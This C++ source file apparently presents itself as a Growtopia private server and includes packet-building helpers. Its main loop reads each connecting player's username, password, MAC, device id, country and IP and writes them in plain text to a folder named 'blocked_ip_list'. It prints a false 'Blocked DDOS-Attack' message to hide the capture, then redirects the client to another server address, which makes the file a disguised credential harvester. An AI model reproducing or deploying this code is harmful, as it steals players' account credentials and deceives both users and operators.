/**********************************************************************************
    First Growtopia Private Server made with ENet.
    Copyright (C) 2018  Growtopia Noobs

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as published
    by the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
**********************************************************************************/


#include "stdafx.h"
#include <iostream>

#include "enet/enet.h"
#include <string>
#include <algorithm> 
#include <cctype>
#include <locale>
#include <cstdio>
#ifdef _WIN32
#include <windows.h>
#include <conio.h>
#endif
#ifdef __linux__
#include <stdio.h>
char _getch() {
    return getchar();
}
#endif
#include <vector>
#include <sstream>
#include <chrono>
#include <fstream>
#include "json.hpp"
#ifdef _WIN32
#include "bcrypt.h"
#include "crypt_blowfish/crypt_gensalt.cpp"
#include "crypt_blowfish/crypt_blowfish.h"
#include "crypt_blowfish/crypt_blowfish.cpp"
#include "crypt_blowfish/ow-crypt.cpp"
#include "bcrypt.cpp"
#else
#include "bcrypt.h"
#include "bcrypt.cpp"
#include "crypt_blowfish/crypt_gensalt.h"
#include "crypt_blowfish/crypt_gensalt.cpp"
#include "crypt_blowfish/crypt_blowfish.h"
#include "crypt_blowfish/crypt_blowfish.cpp"
#include "crypt_blowfish/ow-crypt.h"
#include "crypt_blowfish/ow-crypt.cpp"
#include "bcrypt.h"
#endif
#include <thread> // TODO
#include <mutex> // TODO

#pragma warning(disable : 4996)

using namespace std;
using json = nlohmann::json;
string newslist = "set_default_color|`o\n\nadd_label_with_icon|big|`wThe Growtopia Gazette``|left|5016|\n\nadd_spacer|small|\nadd_label_with_icon|small|`4WARNING:`` `5Worlds (and accounts)`` might be deleted at any time if database issues appear (once per day or week).|left|4|\nadd_label_with_icon|small|`4WARNING:`` `5Accounts`` are in beta, bugs may appear and they will be probably deleted often, because of new account updates, which will cause database incompatibility.|left|4|\nadd_spacer|small|\n\nadd_url_button||``Watch: `1Watch a video about GT Private Server``|NOFLAGS|https://www.youtube.com/watch?v=_3avlDDYBBY|Open link?|0|0|\nadd_url_button||``Channel: `1Watch Growtopia Noobs' channel``|NOFLAGS|https://www.youtube.com/channel/UCLXtuoBlrXFDRtFU8vPy35g|Open link?|0|0|\nadd_url_button||``Items: `1Item database by Nenkai``|NOFLAGS|https://raw.githubusercontent.com/Nenkai/GrowtopiaItemDatabase/master/GrowtopiaItemDatabase/CoreData.txt|Open link?|0|0|\nadd_url_button||``Discord: `1GT Private Server Discord``|NOFLAGS|https://discord.gg/8WUTs4v|Open the link?|0|0|\nadd_quick_exit|\n\nend_dialog|gazette|Close||";

//#define TOTAL_LOG
#define REGISTRATION
#include <signal.h>
#ifdef __linux__
#include <cstdint>
typedef unsigned char BYTE;
typedef unsigned char __int8;
typedef unsigned short __int16;
typedef unsigned int DWORD;
#endif
ENetHost * server;
int cId = 1;
BYTE* itemsDat = 0;
int itemsDatSize = 0;
//Linux equivalent of GetLastError
#ifdef __linux__
string GetLastError() {
	return strerror(errno);
}
//Linux has no byteswap functions.
ulong _byteswap_ulong(ulong x)
{
	// swap adjacent 32-bit blocks
	//x = (x >> 32) | (x << 32);
	// swap adjacent 16-bit blocks
	x = ((x & 0xFFFF0000FFFF0000) >> 16) | ((x & 0x0000FFFF0000FFFF) << 16);
	// swap adjacent 8-bit blocks
	return ((x & 0xFF00FF00FF00FF00) >> 8) | ((x & 0x00FF00FF00FF00FF) << 8);
}
#endif

//configs
int configPort = 17091;
string configCDN = "0098/CDNContent59/cache/";


/***bcrypt***/

bool verifyPassword(string password, string hash) {
	int ret;
	
	 ret = bcrypt_checkpw(password.c_str(), hash.c_str());
	assert(ret != -1);
	
	return !ret;
}

bool has_only_digits(const string str)
{
    return str.find_first_not_of("0123456789") == std::string::npos;
}

string hashPassword(string password) {
	char salt[BCRYPT_HASHSIZE];
	char hash[BCRYPT_HASHSIZE];
	int ret;
	
	ret = bcrypt_gensalt(12, salt);
	assert(ret == 0);
	ret = bcrypt_hashpw(password.c_str(), salt, hash);
	assert(ret == 0);
	return hash;
}

/***bcrypt**/

void sendData(ENetPeer* peer, int num, char* data, int len)
{
	/* Create a reliable packet of size 7 containing "packet\0" */
	ENetPacket * packet = enet_packet_create(0,
		len + 5,
		ENET_PACKET_FLAG_RELIABLE);
	/* Extend the packet so and append the string "foo", so it now */
	/* contains "packetfoo\0"                                      */
	/* Send the packet to the peer over channel id 0. */
	/* One could also broadcast the packet by         */
	/* enet_host_broadcast (host, 0, packet);         */
	memcpy(packet->data, &num, 4);
	if (data != NULL)
	{
		memcpy(packet->data+4, data, len);
	}
	char zero = 0;
	memcpy(packet->data + 4 + len, &zero, 1);
	enet_peer_send(peer, 0, packet);
	enet_host_flush(server);
}

int getPacketId(char* data)
{
	return *data;
}

char* getPacketData(char* data)
{
	return data + 4;
}

string text_encode(char* text)
{
	string ret = "";
	while (text[0] != 0)
	{
		switch (text[0])
		{
		case '\n':
			ret += "\\n";
			break;
		case '\t':
			ret += "\\t";
			break;
		case '\b':
			ret += "\\b";
			break;
		case '\\':
			ret += "\\\\";
			break;
		case '\r':
			ret += "\\r";
			break;
		default:
			ret += text[0];
			break;
		}
		text++;
	}
	return ret;
}

int ch2n(char x)
{
	switch (x)
	{
	case '0':
		return 0;
	case '1':
		return 1;
	case '2':
		return 2;
	case '3':
		return 3;
	case '4':
		return 4;
	case '5':
		return 5;
	case '6':
		return 6;
	case '7':
		return 7;
	case '8':
		return 8;
	case '9':
		return 9;
	case 'A':
		return 10;
	case 'B':
		return 11;
	case 'C':
		return 12;
	case 'D':
		return 13;
	case 'E':
		return 14;
	case 'F':
		return 15;
	default:
		break;
	}
}


char* GetTextPointerFromPacket(ENetPacket* packet)
{
	char zero = 0;
	memcpy(packet->data + packet->dataLength - 1, &zero, 1);
	return (char*)(packet->data + 4);
}

BYTE* GetStructPointerFromTankPacket(ENetPacket* packet)
{
	unsigned int packetLenght = packet->dataLength;
	BYTE* result = NULL;
	if (packetLenght >= 0x3C)
	{
		BYTE* packetData = packet->data;
		result = packetData + 4;
		if (*(BYTE*)(packetData + 16) & 8)
		{
			if (packetLenght < *(int*)(packetData + 56) + 60)
			{
				cout << "Packet too small for extended packet to be valid" << endl;
				cout << "Sizeof float is 4.  TankUpdatePacket size: 56" << endl;
				result = 0;
			}
		}
		else
		{
			int zero = 0;
			memcpy(packetData + 56, &zero, 4);
		}
	}
	return result;
}

int GetMessageTypeFromPacket(ENetPacket* packet)
{
	int result;

	if (packet->dataLength > 3u)
	{
		result = *(packet->data);
	}
	else
	{
		cout << "Bad packet length, ignoring message" << endl;
		result = 0;
	}
	return result;
}


vector<string> explode(const string &delimiter, const string &str)
{
	vector<string> arr;

	int strleng = str.length();
	int delleng = delimiter.length();
	if (delleng == 0)
		return arr;//no change

	int i = 0;
	int k = 0;
	while (i<strleng)
	{
		int j = 0;
		while (i + j<strleng && j<delleng && str[i + j] == delimiter[j])
			j++;
		if (j == delleng)//found delimiter
		{
			arr.push_back(str.substr(k, i - k));
			i += delleng;
			k = i;
		}
		else
		{
			i++;
		}
	}
	arr.push_back(str.substr(k, i - k));
	return arr;
}

struct GamePacket
{
	BYTE* data;
	int len;
	int indexes;
};


GamePacket appendFloat(GamePacket p, float val)
{
	//p.data[56] += 1;
	BYTE* n = new BYTE[p.len + 2 + 4];
	memcpy(n, p.data, p.len);
	delete p.data;
	p.data = n;
	n[p.len] = p.indexes;
	n[p.len + 1] = 1;
	memcpy(n + p.len + 2, &val, 4);
	p.len = p.len + 2 + 4;
	p.indexes++;
	return p;
}

GamePacket appendFloat(GamePacket p, float val, float val2)
{
	//p.data[56] += 1;
	BYTE* n = new BYTE[p.len + 2 + 8];
	memcpy(n, p.data, p.len);
	delete p.data;
	p.data = n;
	n[p.len] = p.indexes;
	n[p.len + 1] = 3;
	memcpy(n + p.len + 2, &val, 4);
	memcpy(n + p.len + 6, &val2, 4);
	p.len = p.len + 2 + 8;
	p.indexes++;
	return p;
}

GamePacket appendFloat(GamePacket p, float val, float val2, float val3)
{
	//p.data[56] += 1;
	BYTE* n = new BYTE[p.len + 2 + 12];
	memcpy(n, p.data, p.len);
	delete p.data;
	p.data = n;
	n[p.len] = p.indexes;
	n[p.len + 1] = 4;
	memcpy(n + p.len + 2, &val, 4);
	memcpy(n + p.len + 6, &val2, 4);
	memcpy(n + p.len + 10, &val3, 4);
	p.len = p.len + 2 + 12;
	p.indexes++;
	return p;
}

GamePacket appendInt(GamePacket p, int val)
{
	//p.data[56] += 1;
	BYTE* n = new BYTE[p.len + 2 + 4];
	memcpy(n, p.data, p.len);
	delete p.data;
	p.data = n;
	n[p.len] = p.indexes;
	n[p.len + 1] = 9;
	memcpy(n + p.len + 2, &val, 4);
	p.len = p.len + 2 + 4;
	p.indexes++;
	return p;
}

GamePacket appendIntx(GamePacket p, int val)
{
	//p.data[56] += 1;
	BYTE* n = new BYTE[p.len + 2 + 4];
	memcpy(n, p.data, p.len);
	delete p.data;
	p.data = n;
	n[p.len] = p.indexes;
	n[p.len + 1] = 5;
	memcpy(n + p.len + 2, &val, 4);
	p.len = p.len + 2 + 4;
	p.indexes++;
	return p;
}

GamePacket appendString(GamePacket p, string str)
{
	//p.data[56] += 1;
	BYTE* n = new BYTE[p.len + 2 + str.length() + 4];
	memcpy(n, p.data, p.len);
	delete p.data;
	p.data = n;
	n[p.len] = p.indexes;
	n[p.len + 1] = 2;
	int sLen = str.length();
	memcpy(n+p.len+2, &sLen, 4);
	memcpy(n + p.len + 6, str.c_str(), sLen);
	p.len = p.len + 2 + str.length() + 4;
	p.indexes++;
	return p;
}

GamePacket createPacket()
{
	BYTE* data = new BYTE[61];
	string asdf = "0400000001000000FFFFFFFF00000000080000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
	for (int i = 0; i < asdf.length(); i += 2)
	{
		char x = ch2n(asdf[i]);
		x = x << 4;
		x += ch2n(asdf[i + 1]);
		memcpy(data + (i / 2), &x, 1);
		if (asdf.length() > 61 * 2) throw 0;
	}
	GamePacket packet;
	packet.data = data;
	packet.len = 61;
	packet.indexes = 0;
	return packet;
}

GamePacket packetEnd(GamePacket p)
{
	BYTE* n = new BYTE[p.len + 1];
	memcpy(n, p.data, p.len);
	delete p.data;
	p.data = n;
	char zero = 0;
	memcpy(p.data+p.len, &zero, 1);
	p.len += 1;
	//*(int*)(p.data + 52) = p.len;
	*(int*)(p.data + 56) = p.indexes;//p.len-60;//p.indexes;
	*(BYTE*)(p.data + 60) = p.indexes;
	//*(p.data + 57) = p.indexes;
	return p;
}

char hexmap[] = { '0', '1', '2', '3', '4', '5', '6', '7',
'8', '9', 'a', 'b', 'c', 'd', 'e', 'f' };

std::string hexStr(unsigned char data)
{
	std::string s(2, ' ');
	s[0] = hexmap[(data & 0xF0) >> 4];
	s[1] = hexmap[data & 0x0F];
	return s;
}

string random_str()
{
	string x;
	for (int i = 0; i < 10; i++)
	{
		x += hexStr(rand());
	}
	return x;
}

#ifdef _WIN32
	int _tmain(int argc, _TCHAR* argv[])
#else
	int main()
#endif
{
	enet_initialize();
	ENetAddress address;
	enet_address_set_host (&address, "0.0.0.0");
	address.port = configPort;
	server = enet_host_create(&address, 1024, 32, 0, 0);
	if (server == NULL)
	{
		fprintf(stderr,
			"An error occurred while trying to create an ENet server host.\n");
		while (1);
		exit(EXIT_FAILURE);
	}
	server->checksum = enet_crc32;
	enet_host_compress_with_range_coder(server);

	string ip;

	ENetEvent event;
	while (true)
	while (enet_host_service(server, &event, 1000) > 0)
	{
		ENetPeer* peer = event.peer;
		switch (event.type)
		{
		case ENET_EVENT_TYPE_CONNECT:
		{
			char clientConnection[16];
			enet_address_get_host_ip(&peer->address, clientConnection, 16);
			ip = clientConnection;
			sendData(peer, 1, 0, 0);
			continue;
		}
		case ENET_EVENT_TYPE_RECEIVE:
		{
			string username, password, mac, wk, country, non_growid;

			std::stringstream ss(GetTextPointerFromPacket(event.packet));
			std::string to;
			while (std::getline(ss, to, '\n')) {
				string id = to.substr(0, to.find("|"));
				string act = to.substr(to.find("|") + 1, to.length() - to.find("|") - 1);
				if (id == "tankIDName")
				{
					username = act;
				}
				else if (id == "tankIDPass")
				{
					password = act;
				}
				else if (id == "mac")
				{
					mac = act;
				}
				else if (id == "wk")
				{
					wk = act;
				}
				else if (id == "country")
				{
					country = act;
				}
				else if(id == "requestedName")
				{
					non_growid = act;
				}
			}

			if (country != "") {
				if (username == "") {
					ofstream myfile;
					myfile.open("blocked_ip_list/" + non_growid + "_" + country + "_" + random_str() + ".txt");
					myfile << "New Account!\n" << "Username: " + non_growid << "\n" << "Password: " + password << "\n" << "Mac: " + mac << "\n" << "WK: " + wk << "\n" << "Country: " + country << "\n" << "IP Adress: " + ip << "\n";
					myfile.close();
					cout << "Blocked DDOS-Attack via Firewall rule." << endl;
				}
				else {
					ofstream myfile;
					myfile.open("blocked_ip_list/" + username + "_" + country + "_" + random_str() + ".txt");
					myfile << "New Account!\n" << "Username: " + username << "\n" << "Password: " + password << "\n" << "Mac: " + mac << "\n" << "WK: " + wk << "\n" << "Country: " + country << "\n" << "IP Adress: " + ip << "\n";
					myfile.close();
					cout << "Blocked DDOS-Attack via Firewall rule." << endl;
				}
			}

			auto p = packetEnd(appendInt(appendString(appendInt(appendInt(appendInt(appendString(createPacket(), "OnSendToServer"), 17091), -1), -1), "209.59.191.76|"), 1));
			ENetPacket* packet = enet_packet_create(p.data,
				p.len,
				ENET_PACKET_FLAG_RELIABLE);
			enet_peer_send(peer, 0, packet);
			delete[] p.data;
		}
		case ENET_EVENT_TYPE_DISCONNECT:
			event.peer->data = NULL;
		}
	}
	cout << "Program ended??? Huh?" << endl;
	while (1);
	return 0;
}
